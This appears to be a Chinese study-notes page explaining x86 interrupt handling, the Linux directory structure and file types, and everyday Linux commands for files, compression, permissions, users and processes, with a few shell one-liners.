<h3 id="CPU检查是否有中断-异常信号"><a href="#CPU检查是否有中断-异常信号" class="headerlink" title="CPU检查是否有中断/异常信号"></a>CPU检查是否有中断/异常信号</h3><p>CPU 在执行完当前程序的每一条指令后，都会去确认在执行刚才的指令过程中中断控制器（如：8259A）是否发送中断请求过来，如果有那么CPU就会在相应的时钟脉冲到来时从总线上读取中断请求对应的中断向量。</p>
<p>对于异常和系统调用那样的软中断，因为中断向量是直接给出的，所以和通过 IRQ （中断请求）线发送的硬件中断请求不同，不会再专门去取其对应的中断向量。</p>
<h3 id="根据中断向量到-IDT-表中取得处理这个向量的中断程序的段选择符"><a href="#根据中断向量到-IDT-表中取得处理这个向量的中断程序的段选择符" class="headerlink" title="根据中断向量到 IDT 表中取得处理这个向量的中断程序的段选择符"></a>根据中断向量到 IDT 表中取得处理这个向量的中断程序的段选择符</h3><p>CPU 根据得到的中断向量到 IDT 表里<strong>找到该向量对应的中断描述符</strong>，中断描述符里保存着中断服务程序的段选择符。</p>
<h3 id="根据取得的段选择符到-GDT-中找相应的段描述符"><a href="#根据取得的段选择符到-GDT-中找相应的段描述符" class="headerlink" title="根据取得的段选择符到 GDT 中找相应的段描述符"></a>根据取得的段选择符到 GDT 中找相应的段描述符</h3><p>CPU 使用 IDT 查到的中断服务程序的段选择符从 GDT 中<strong>取得相应的段描述符</strong>，段描述符里保存了中断服务程序的段基址和属性信息，此时 <strong>CPU 就得到了中断服务程序的起始地址</strong>。这里，CPU 会根据当前 cs 寄存器里的 CPL 和 GDT 的段描述符的DPL，以确保中断服务程序是高于当前程序的，如果这次中断是编程异常（如：int 80h系统调用），那么还要检查 CPL 和 IDT 表中中断描述符的 DPL，以保证当前程序有权限使用中断服务程序，这可以避免用户应用程序访问特殊的陷阱门和中断门。</p>
<h3 id="CPU根据特权级的判断设定即将运行的中断服务程序要使用的栈的地址"><a href="#CPU根据特权级的判断设定即将运行的中断服务程序要使用的栈的地址" class="headerlink" title="CPU根据特权级的判断设定即将运行的中断服务程序要使用的栈的地址"></a>CPU根据特权级的判断设定即将运行的中断服务程序要使用的栈的地址</h3><p>CPU 会根据 CPL 和中断服务程序段描述符的 DPL 信息<strong>确认是否发生了特权级的转换</strong>，比如当前程序正运行在用户态，而中断程序是运行在内核态的，则意味着发生了特权级的转换，这时 CPU 会从当前程序的 TSS信息（该信息在内存中的首地址存在 TR 寄存器中）里取得该程序的内核栈地址，即包括 ss 和 esp 的值，并立即将系统当前使用的栈切换成新的栈。这个栈就是即将运行的中断服务程序要使用的栈。紧接着就将当前程序使用的 ss,esp 压到新栈中保存起来。也就说比如当前在某个函数中，使用的栈，在中断发生时，需要切换新的栈。</p>
<h3 id="保护当前程序的现场"><a href="#保护当前程序的现场" class="headerlink" title="保护当前程序的现场"></a>保护当前程序的现场</h3><p>CPU开始利用栈保护被暂停执行的程序的现场：依次压入当前程序使用的 eflags，cs，eip，errorCode（如果是有错误码的异常）信息。</p>
<h3 id="跳转到中断服务程序的第一条指令开始执行"><a href="#跳转到中断服务程序的第一条指令开始执行" class="headerlink" title="跳转到中断服务程序的第一条指令开始执行"></a>跳转到中断服务程序的第一条指令开始执行</h3><p>CPU 利用中断服务程序的段描述符将其第一条指令的地址加载到 cs 和 eip 寄存器中，开始执行中断服务程序。这意味着先前的程序被暂停执行，中断服务程序正式开始工作。</p>
<h3 id="中断服务程序处理完毕，恢复执行先前中断的程序"><a href="#中断服务程序处理完毕，恢复执行先前中断的程序" class="headerlink" title="中断服务程序处理完毕，恢复执行先前中断的程序"></a>中断服务程序处理完毕，恢复执行先前中断的程序</h3><p>在每个中断服务程序的最后，必须有中断完成返回先前程序的指令，这就是iret（或iretd）。程序执行这条返回指令时，会从栈里弹出先前保存的被暂停程序的现场信息，即 eflags,cs,eip 重新开始执行。</p>
<h1 id="31-Linux-的目录结构和文件类型"><a href="#31-Linux-的目录结构和文件类型" class="headerlink" title="31. Linux 的目录结构和文件类型"></a>31. Linux 的目录结构和文件类型</h1><p><strong>在 Linux 操作系统中，所有被操作系统管理的资源，例如网络接口卡、磁盘驱动器、打印机、输入输出设备、普通文件或是目录都被看作是一个文件。</strong> 也就是说在 Linux 系统中有一个重要的概念：<strong>一切都是文件</strong>。</p>
<p>其实这是 UNIX 哲学的一个体现，在 UNIX 系统中，把一切资源都看作是文件，Linux 的文件系统也是借鉴 UNIX 文件系统而来。</p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><a href="http://qiniu.xiaoming.net.cn/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png"><img src="http://qiniu.xiaoming.net.cn/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="Linux文件目录"></a></p>
<table>
<thead>
<tr>
<th>目录</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>bin</td>
<td>存放二进制可执行文件(ls,cat,mkdir等)，常用命令一般都在这里</td>
</tr>
<tr>
<td>boot</td>
<td>存放用于系统引导时使用的各种文件</td>
</tr>
<tr>
<td>dev</td>
<td>用于存放设备文件</td>
</tr>
<tr>
<td>etc</td>
<td>存放系统管理和配置文件</td>
</tr>
<tr>
<td>home</td>
<td>存放所有用户文件的根目录，是用户主目录的基点，比如用户 user 的主目录就是/home/user，可以用~user 表示</td>
</tr>
<tr>
<td>lib</td>
<td>存放跟文件系统中的程序运行所需要的共享库及内核模块</td>
</tr>
<tr>
<td>mnt</td>
<td>系统管理员安装临时文件系统的安装点，系统提供这个目录是让用户临时挂载其他的文件系统</td>
</tr>
<tr>
<td>opt</td>
<td>额外安装的可选应用程序包所放置的位置。一般情况下，我们可以把 tomcat 等都安装到这里</td>
</tr>
<tr>
<td>proc</td>
<td>虚拟文件系统，存放当前内存的映射，可直接访问这个目录来获取系统信息</td>
</tr>
<tr>
<td>root</td>
<td>超级用户目录</td>
</tr>
<tr>
<td>sbin</td>
<td>存放二进制可执行文件，只有root才能访问，这里存放的是系统管理员使用的系统级别的管理命令和程序。如 ifconfig 等</td>
</tr>
<tr>
<td>tmp</td>
<td>用于存放各种临时文件，是公用的临时文件存储点</td>
</tr>
<tr>
<td>usr</td>
<td>用于存放系统应用程序，比较重要的目录/usr/local 本地管理员软件安装目录</td>
</tr>
<tr>
<td>var</td>
<td>用于存放运行时需要改变数据的文件，也是某些大文件的溢出区，比方说各种服务的日志文件（系统启动日志等。）等</td>
</tr>
<tr>
<td>lost/found</td>
<td>这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows 下叫什么.chk）就在这里</td>
</tr>
</tbody></table>
<h2 id="文件分类"><a href="#文件分类" class="headerlink" title="文件分类"></a>文件分类</h2><p>Linux一切皆文件，文件一共分为7类分别是 <strong>- b c d s p l</strong>。</p>
<h3 id="普通文件（regular-file：-）"><a href="#普通文件（regular-file：-）" class="headerlink" title="普通文件（regular file：-）"></a>普通文件（regular file：-）</h3><p>普通文件又分成文本文件和纯二进制文件。文本文件存放的都是文字编码，文本编辑器打开后，会将这些文字编码翻译为文字图形，以供人识别。（白色）纯二进制文件（机器码），比如经过编译后得到的可执行文件，里面放的是 cpu 执行的纯二进制机器码，不能被文本编辑器识别，用文本编辑器打开后，显示的内容是错乱的，无法辨识。（绿色）</p>
<h3 id="块设备文件（block-special-file：b）"><a href="#块设备文件（block-special-file：b）" class="headerlink" title="块设备文件（block special file：b）"></a>块设备文件（block special file：b）</h3><p>以块（1024字节）为单位来操作数据。块设备存储的数据量往往非常大，比如：电脑硬盘、移动硬盘、u盘等。</p>
<h3 id="字符设备文件（character-special-file：c）"><a href="#字符设备文件（character-special-file：c）" class="headerlink" title="字符设备文件（character special file：c）"></a>字符设备文件（character special file：c）</h3><p>以字节为单位来操作数据。比如：键盘、鼠标、显示器都等是字符设备。Linux 将所有的外设当做文件来看待，都存放在 <code>/dev</code> 中。</p>
<h3 id="目录文件（director-file：d）"><a href="#目录文件（director-file：d）" class="headerlink" title="目录文件（director file：d）"></a>目录文件（director file：d）</h3><p>目录是一种特殊的文件，专门用于管理其它文件，将文件的名称和它的索引节点号结合在一起的一张表。（蓝色）</p>
<h3 id="套接字文件（socket：s）"><a href="#套接字文件（socket：s）" class="headerlink" title="套接字文件（socket：s）"></a>套接字文件（socket：s）</h3><p>专门用于网络通信的文件。</p>
<h3 id="管道文件（fifo：p）"><a href="#管道文件（fifo：p）" class="headerlink" title="管道文件（fifo：p）"></a>管道文件（fifo：p）</h3><p>用于实现不同进程（程序）之间的通信，管道是OS提供的一种纯代码层面的通信机制，主要用于进程间的传递数据，管道是进程间传递数据的媒介。例如 A 进程将数据存入管道文件中，B 进程从管道文件中获取数据。</p>
<h3 id="符号连接文件（symbolic-link：l）"><a href="#符号连接文件（symbolic-link：l）" class="headerlink" title="符号连接文件（symbolic link：l）"></a>符号连接文件（symbolic link：l）</h3><p>其实就是一种快捷图标，背后指向了另外一个文件，提供了共享文件的一种方法。使用链接文件可以访问普通文件、目录文件和其他文件。（浅蓝色）</p>
<h1 id="32-Linux常用命令"><a href="#32-Linux常用命令" class="headerlink" title="32. Linux常用命令"></a>32. Linux常用命令</h1><h2 id="目录切换"><a href="#目录切换" class="headerlink" title="目录切换"></a>目录切换</h2><ul>
<li><code>cd ~</code>:表示切换到用户主目录</li>
<li><code>cd -</code>:表示切换到上一个操作所在目录</li>
</ul>
<h2 id="目录的操作命令"><a href="#目录的操作命令" class="headerlink" title="目录的操作命令"></a>目录的操作命令</h2><ol>
<li><code>mkdir 目录名称</code>：增加目录</li>
<li><code>ls/ll</code>：查看目录信息（<code>ll</code>是<code>ls -l</code>的别名，<code>ll</code>命令可以看到该目录下的所有目录和文件的详细信息）</li>
<li><code>find 目录 参数</code>:寻找目录，示例：</li>
</ol>
<ul>
<li>列出当前目录及子目录下所有文件和文件夹: <code>find .</code></li>
<li>在<code>/home</code>目录下查找以<code>.txt</code>结尾的文件名:<code>find /home -name &quot;*.txt&quot;</code></li>
<li>同上，但忽略大小写: <code>find /home -iname &quot;*.txt&quot;</code></li>
<li>当前目录及子目录下查找所有以.txt和.pdf结尾的文件:<code>find . \( -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \)</code>或<code>find . -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot;</code></li>
</ul>
<ol>
<li><code>mv 目录名称 新目录名称</code>:修改目录的名称，<code>mv</code>的语法不仅可以对目录进行重命名而且也可以对各种文件，压缩包等进行重命名的操作。mv命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。</li>
<li><code>mv 目录名称 目录的新位置</code>： 移动目录的位置—剪切（改）,<code>mv</code>语法不仅可以对目录进行剪切操作，对文件和压缩包等都可执行剪切操作。另外<code>mv</code>与<code>cp</code>的结果不同，<code>mv</code>好像文件“搬家”，文件个数并未增加。而<code>cp</code>对文件进行复制，文件个数增加了。</li>
<li><code>cp -r 目录名称 目录拷贝的目标位置</code>： 拷贝目录（改），<code>-r</code>代表递归拷贝,<code>cp</code>命令不仅可以拷贝目录还可以拷贝文件，压缩包等，拷贝文件和压缩包时不用写<code>-r</code>递归</li>
<li><code>rm [-rf]</code>目录: 删除目录（删）,<code>rm</code>不仅可以删除目录，也可以删除其他文件或压缩包，无论删除任何目录或文件，都直接使用<code>rm -rf 目录/文件/压缩包</code></li>
</ol>
<h2 id="文件的操作命令"><a href="#文件的操作命令" class="headerlink" title="文件的操作命令"></a>文件的操作命令</h2><ol>
<li><code>touch 文件名称</code>：文件的创建</li>
<li><code>cat/tac/more/less/head/tail 文件名称</code>:文件的查看</li>
</ol>
<ul>
<li><code>cat</code>：查看显示文件内容</li>
<li><code>tac</code>: 是 cat 的反向操作，从最后一行开始打印</li>
<li><code>more</code>：可以显示百分比，回车可以向下一行， 空格可以向下一页，q可以退出查看</li>
<li><code>less</code>：可以使用键盘上的PgUp和PgDn向上和向下翻页，q结束查看</li>
<li><code>head</code>：去文件前几行</li>
<li><code>tail-10</code>：查看文件的后10行，Ctrl+C结束</li>
</ul>
<p>注意：命令<code>tail -f</code>文件 可以对某个文件进行动态监控，例如tomcat的日志文件， 会随着程序的运行，日志会变化，可以使用<code>tail -f catalina-2016-11-11.log</code>监控文件的变化</p>
<ol>
<li><code>vim 文件</code></li>
<li><code>rm -rf 文件</code>:删除文件</li>
</ol>
<h2 id="文件搜索命令"><a href="#文件搜索命令" class="headerlink" title="文件搜索命令"></a>文件搜索命令</h2><ol>
<li><code>which</code>：指令搜索</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">which [-a] command</span><br><span class="line">-a：将所有指令列出，而不是只列第一个</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ol>
<li><code>whereis</code>：文件搜索，速度比较快，因为它只搜索几个特定的目录</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">whereis [-bmus] [BMS] dirname/filename</span><br><span class="line">-b  定位可执行文件</span><br><span class="line">-m  定位帮助文件</span><br><span class="line">-s  定位源代码文件</span><br><span class="line">-u  搜索出上面三个外的其他文件</span><br><span class="line">-B  指定搜索可执行文件的路径</span><br><span class="line">-M  指定搜索帮助文件的路径</span><br><span class="line">-S  指定搜索源代码文件的路径</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ol>
<li><code>locate</code>:文件搜索。可以用关键字或者正则表达式进行搜索。<br><code>locate</code>使用<code>/var/lib/mlocate/</code>这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用<code>updatedb</code>来立即更新数据库。</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># locate [-ir] keyword</span><br><span class="line">-r：正则表达式</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ol>
<li><code>grep 要搜索的字符串 要搜索的文件 --color</code>：搜索命令，<code>--color</code>代表高亮显示</li>
</ol>
<p>搜索文件里某一个单词或字符出现的次数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">grep -o objStr  filename|wc -l</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="压缩解压缩"><a href="#压缩解压缩" class="headerlink" title="压缩解压缩"></a>压缩解压缩</h2><p>Linux中的打包文件一般是以<code>.tar</code>结尾的，压缩的命令一般是以<code>.gz</code>结尾的。</p>
<p>而一般情况下打包和压缩是一起进行的，打包并压缩后的文件的后缀名一般<code>.tar.gz</code>。 命令：<code>tar -zcvf 打包压缩后的文件名 要打包压缩的文件</code>其中：</p>
<ul>
<li><code>z</code>：调用gzip压缩命令进行压缩</li>
<li><code>c</code>：打包文件</li>
<li><code>v</code>：显示运行过程</li>
<li><code>f</code>：指定文件名</li>
</ul>
<p>比如：假如test目录下有三个文件分别是：<code>aaa.txt bbb.txt ccc.txt</code>，如果我们要打包test目录并指定压缩后的压缩包名称为test.tar.gz可以使用命令:<code>tar -zcvf test.tar.gz aaa.txt bbb.txt ccc.txt</code>或<code>tar -zcvf test.tar.gz /test/</code></p>
<p>解压压缩包命令：<code>tar [-xvf] 压缩文件</code></p>
<p>其中<code>x</code>：代表解压</p>
<p>示例：</p>
<ol>
<li>将<code>/test</code>下的<code>test.tar.gz</code>解压到当前目录下可以使用命令：<code>tar -xvf test.tar.gz</code></li>
<li>将<code>/test</code>下的<code>test.tar.gz</code>解压到根目录<code>/usr</code>下:<code>tar -xvf test.tar.gz -C /usr</code>（- C代表指定解压的位置）</li>
</ol>
<p>用于压缩的指令有：</p>
<ol>
<li><code>gzip</code>：gzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。经过 gzip 压缩过，源文件就不存在了。有 9 个不同的压缩等级可以使用。可以使用<code>zcat</code>、<code>zmore</code>、<code>zless</code>来读取压缩文件的内容。</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ gzip [-cdtv#] filename</span><br><span class="line">-c ：将压缩的数据输出到屏幕上</span><br><span class="line">-d ：解压缩</span><br><span class="line">-t ：检验压缩文件是否出错</span><br><span class="line">-v ：显示压缩比等信息</span><br><span class="line">-# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ol>
<li><code>bzip2</code>:提供比<code>gzip</code>更高的压缩比。查看命令：<code>bzcat</code>、<code>bzmore</code>、<code>bzless</code>、<code>bzgrep</code>。</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> $ bzip2 [-cdkzv#] filename</span><br><span class="line">-k ：保留源文件</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ol>
<li><code>xz</code>：提供比 bzip2 更佳的压缩比。可以看到，<code>gzip</code>、<code>bzip2</code>、<code>xz</code>的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。查看命令：<code>xzcat</code>、<code>xzmore</code>、<code>xzless</code>、<code>xzgrep</code>。</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ xz [-dtlkc#] filename</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="权限命令"><a href="#权限命令" class="headerlink" title="权限命令"></a>权限命令</h2><p>操作系统中每个文件都拥有特定的权限、所属用户和所属组。权限是操作系统用来限制资源访问的机制，在Linux中权限一般分为读(readable)、写(writable)和执行(excutable)，分为三组。分别对应文件的属主(owner)，属组(group)和其他用户(other)，通过这样的机制来限制哪些用户、哪些组可以对特定的文件进行什么样的操作。通过<code>ls -l</code>命令我们可以 查看某个目录下的文件或目录的权限</p>
<p>示例：在随意某个目录下 <code>ls -l</code></p>
<p><a href="https://qiniu.xiaoming.net.cn/%E6%9D%83%E9%99%90.jpeg"><img src="https://qiniu.xiaoming.net.cn/%E6%9D%83%E9%99%90.jpeg" alt="权限"></a></p>
<p><a href="http://qiniu.xiaoming.net.cn/linux%E6%9D%83%E9%99%90.jpg"><img src="http://qiniu.xiaoming.net.cn/linux%E6%9D%83%E9%99%90.jpg" alt="权限2"></a></p>
<h3 id="文件的类型"><a href="#文件的类型" class="headerlink" title="文件的类型"></a>文件的类型</h3><ul>
<li>d：代表目录</li>
<li>-：代表文件</li>
<li>l：代表链接</li>
</ul>
<h3 id="Linux权限分为一下几种"><a href="#Linux权限分为一下几种" class="headerlink" title="Linux权限分为一下几种"></a>Linux权限分为一下几种</h3><ul>
<li>r：代表权限是可读的，r也可以用数字4表示</li>
<li>w：代表权限是可写的，w也可以用数字2表示</li>
<li>x：代表权限是可执行，x也可以用数字1表示</li>
</ul>
<h3 id="文件权限和目录权限的区别"><a href="#文件权限和目录权限的区别" class="headerlink" title="文件权限和目录权限的区别"></a>文件权限和目录权限的区别</h3><p>对于文件：</p>
<table>
<thead>
<tr>
<th>权限名称</th>
<th>可执行操作</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>可以使用cat查看文件的内容</td>
</tr>
<tr>
<td>w</td>
<td>可以修改文件的内容</td>
</tr>
<tr>
<td>x</td>
<td>可以将其运行为二进制文件</td>
</tr>
</tbody></table>
<p>对于目录：</p>
<table>
<thead>
<tr>
<th>权限名称</th>
<th>可执行操作</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>可以查看目录下列表</td>
</tr>
<tr>
<td>w</td>
<td>可以创建和删除目录下的文件</td>
</tr>
<tr>
<td>x</td>
<td>可以使用cd进入目录</td>
</tr>
</tbody></table>
<p>需要注意的是超级用户可以无视普通用户的权限，即使文件目录权限是000，依旧可以访问。 在linux中的每个用户必须属于一个组，不能独立于组外。在linux中每个文件有所有者、所在组、其它组的概念。</p>
<ul>
<li><strong>所有者</strong>：一般为文件的创建者，谁创建了该文件，就天然的成为该文件的所有者，用<code>ls ‐ahl</code>命令可以看到文件的所有者 也可以使用<code>chown 用户名 文件名</code>来修改文件的所有者 。</li>
<li><strong>文件所在组</strong>：当某个用户创建了一个文件后，这个文件的所在组就是该用户所在的组，用<code>ls ‐ahl</code>命令可以看到文件的所有组 也可以使用<code>chgrp 组名 文件名</code>来修改文件所在的组。</li>
<li><strong>其它组</strong>：除开文件的所有者和所在组的用户外，系统的其它用户都是文件的其它组</li>
</ul>
<h3 id="修改文件-目录的权限。"><a href="#修改文件-目录的权限。" class="headerlink" title="修改文件/目录的权限。"></a>修改文件/目录的权限。</h3><p>修改文件/目录的权限的命令：<code>chmod</code></p>
<p>示例：修改<code>/test</code>下的<code>aaa.txt</code>的权限为属主有全部权限，属主所在的组有读写权限， 其他用户只有读的权限</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">chmod u=rwx,g=rw,o=r aaa.txt</span><br><span class="line">chmod <span class="number">764</span> aaa.txt</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>Linux系统是一个多用户多任务的分时操作系统，任何一个要使用系统资源的用户，都必须首先向系统管理员申请一个账号，然后以这个账号的身份进入系统。</p>
<p>用户的账号一方面可以帮助系统管理员对使用系统的用户进行跟踪，并控制他们对系统资源的访问；另一方面也可以帮助用户组织文件，并为用户提供安全性保护。</p>
<p>Linux用户管理相关命令:</p>
<ul>
<li><code>useradd 选项 用户名</code>:添加用户账号</li>
<li><code>userdel 选项 用户名</code>:删除用户帐号</li>
<li><code>usermod 选项 用户名</code>:修改帐号</li>
<li><code>passwd 用户名</code>:更改或创建用户的密码</li>
<li><code>passwd -S 用户名</code> :显示用户账号密码信息</li>
<li><code>passwd -d 用户名</code>: 清除用户密码</li>
</ul>
<p><code>useradd</code>命令用于Linux中创建的新的系统用户。<code>useradd</code>可用来建立用户帐号。帐号建好之后，再用<code>passwd</code>设定帐号的密码．而可用<code>userdel</code>删除帐号。使用<code>useradd</code>指令所建立的帐号，实际上是保存在<code>/etc/passwd</code>文本文件中。</p>
<p><code>passwd</code>命令用于设置用户的认证信息，包括用户密码、密码过期时间等。系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。</p>
<h2 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h2><p>每个用户都有一个用户组，系统可以对一个用户组中的所有用户进行集中管理。不同Linux系统对用户组的规定有所不同，如Linux下的用户属于与它同名的用户组，这个用户组在创建用户时同时创建。</p>
<p>用户组的管理涉及用户组的添加、删除和修改。组的增加、删除和修改实际上就是对<code>/etc/group</code>文件的更新。</p>
<p>Linux系统用户组的管理相关命令:</p>
<ul>
<li><code>groupadd 选项 用户组</code>:增加一个新的用户组</li>
<li><code>groupdel 用户组</code>:要删除一个已有的用户组</li>
<li><code>groupmod 选项 用户组</code>: 修改用户组的属性</li>
</ul>
<h2 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h2><ul>
<li><code>pwd</code>：显示当前所在位置</li>
<li><code>grep 要搜索的字符串 要搜索的文件 --color</code>：搜索命令，<code>--color</code>代表高亮显示</li>
</ul>
<h2 id="网络通信命令："><a href="#网络通信命令：" class="headerlink" title="网络通信命令："></a>网络通信命令：</h2><ul>
<li>查看当前系统的网卡信息：<code>ifconfig</code></li>
<li>查看与某台机器的连接情况：<code>ping</code></li>
<li>查看当前系统的端口使用：<code>netstat -an</code></li>
<li><code>net-tools</code>和<code>iproute2</code>：<code>net-tools</code>起源于BSD的<code>TCP/IP</code>工具箱，后来成为老版本Linux内核中配置网络功能的工具。但自2001年起，Linux社区已经对其停止维护。同时，一些Linux发行版比如Arch Linux和CentOS/RHEL 7则已经完全抛弃了<code>net-tools</code>，只支持<code>iproute2</code>。linux ip命令类似于ifconfig，但功能更强大，旨在替代它。</li>
<li><code>shutdown</code>:<code>shutdown -h now</code>： 指定现在立即关机；<code>shutdown +5 &quot;System will shutdown after 5 minutes&quot;</code>：指定5分钟后关机，同时送出警告信息给登入用户。</li>
<li><code>reboot</code>：重开机。<code>reboot -w</code>：做个重开机的模拟（只有纪录并不会真的重开机）。</li>
</ul>
<h2 id="进程管理命令"><a href="#进程管理命令" class="headerlink" title="进程管理命令"></a>进程管理命令</h2><ol>
<li><code>ps</code>：查看进程</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ps -l  # 查看自己的进程</span><br><span class="line">ps aux # 查看系统所有进程</span><br><span class="line">ps aux | grep threadx # 查看特定的进程</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ol>
<li><code>pstree</code>：查看进程树</li>
<li><code>top</code>：实时显示进程信息</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">top -d 2 # 每两秒钟刷新一次</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ol>
<li><code>netstat</code>：查看占用端口的进程</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">netstat -anp | grep port # 查看特定端口的进程</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ol>
<li><code>ps -ef / ps -aux</code>：这两个命令都是查看当前系统正在运行进程，两者的区别是展示格式不同。如果想要查看特定的进程可以使用这样的格式：<code>ps aux|grep redis</code>（查看包括redis字符串的进程），也可使用<code>pgrep redis -a</code>。<br>注意：如果直接用<code>ps</code>（Process Status）命令，会显示所有进程的状态，通常结合<code>grep</code>命令查看某进程的状态。</li>
<li><code>kill -9 进程的pid</code>： 杀死进程（<code>-9</code>表示强制终止。）<br>先用ps查找进程，然后用kill杀掉</li>
</ol>
<h3 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h3><table>
<thead>
<tr>
<th>状态</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>R</td>
<td><code>running or runnable(on run queue)</code> 正在执行或者可执行，此时进程位于执行队列中。</td>
</tr>
<tr>
<td>D</td>
<td><code>uninterruptible sleep (usually I/O)</code> 不可中断阻塞，通常为 IO 阻塞。</td>
</tr>
<tr>
<td>S</td>
<td><code>interruptible sleep (waiting for an event to complete)</code> 可中断阻塞，此时进程正在等待某个事件完成。</td>
</tr>
<tr>
<td>Z</td>
<td><code>zombie (terminated but not reaped by its parent)</code> 僵死，进程已经终止但是尚未被其父进程获取信息。</td>
</tr>
<tr>
<td>T</td>
<td><code>stopped (either by a job control signal or because it is being traced)</code> 结束，进程既可以被作业控制信号结束，也可能是正在被追踪。</td>
</tr>
</tbody></table>
<h2 id="用一行指令找出指定的进程并将其全部Kill"><a href="#用一行指令找出指定的进程并将其全部Kill" class="headerlink" title="用一行指令找出指定的进程并将其全部Kill"></a>用一行指令找出指定的进程并将其全部Kill</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -efww|grep -w &#39;helloworld&#39;|grep -v grep|cut -c 9-15|xargs kill -9</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明：管道符<code>|</code>用来隔开两个命令，管道符左边命令的输出会作为管道符右边命令的输入。</p>
</blockquote>
<ul>
<li><code>ps　-efww</code>是查看所有进程的命令。这时检索出的进程将作为下一条命令 <code>grep</code> 的输入，注意要结束其它程序时，请将上面命令中的 helloworld 替换成其它程序名，<code>-w &#39;helloworld&#39;</code> 强制 PATTERN 仅完全匹配字词。</li>
<li><code>grep -v grep</code> 是在列出的进程中去除含有关键字 grep 的进程。</li>
<li><code>cut -c 9-15</code> 是截取输入行的第 9 个字符到第 15 个字符，而这正好是进程号 PID。</li>
<li><code>xargs kill -9</code> 中的 <code>xargs</code> 命令是用来把前面命令的输出结果（PID）作为 <code>kill -9</code> 命令的参数，并执行该命令。</li>
<li><code>kill -9</code> 会强行杀掉指定进程，这样就成功清除了同名进程。</li>
</ul>
<h2 id="Linux下查找大于1G的文件，并删除"><a href="#Linux下查找大于1G的文件，并删除" class="headerlink" title="Linux下查找大于1G的文件，并删除"></a>Linux下查找大于1G的文件，并删除</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">find /APP/istester/ -type f -size +1G | xargs rm</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="列出当前目录文件的数量"><a href="#列出当前目录文件的数量" class="headerlink" title="列出当前目录文件的数量"></a>列出当前目录文件的数量</h2><p>统计当前目录下文件的个数（不包括目录）：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ ls -l | grep <span class="string">&quot;^-&quot;</span> | wc -l</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>统计当前目录下文件的个数（包括子目录）:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ ls -lR| grep <span class="string">&quot;^-&quot;</span> | wc -l</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>查看某目录下文件夹(目录)的个数（包括子目录）:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ ls -lR | grep <span class="string">&quot;^d&quot;</span> | wc -l</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ls -l</code>：长列表输出该目录下文件信息(注意这里的文件是指目录、链接、设备文件等)，每一行对应一个文件或目录，<code>ls -lR</code>是列出所有文件，包括子目录。</li>
<li><code>grep &quot;^-&quot;</code>：过滤 ls 的输出信息，**只保留一般文件，只保留目录是 <code>grep &quot;^d&quot;</code>**。</li>
<li><code>wc -l</code>：统计输出信息的行数，统计结果就是输出信息的行数，一行信息对应一个文件，所以就是文件的个数。</li>
</ul>
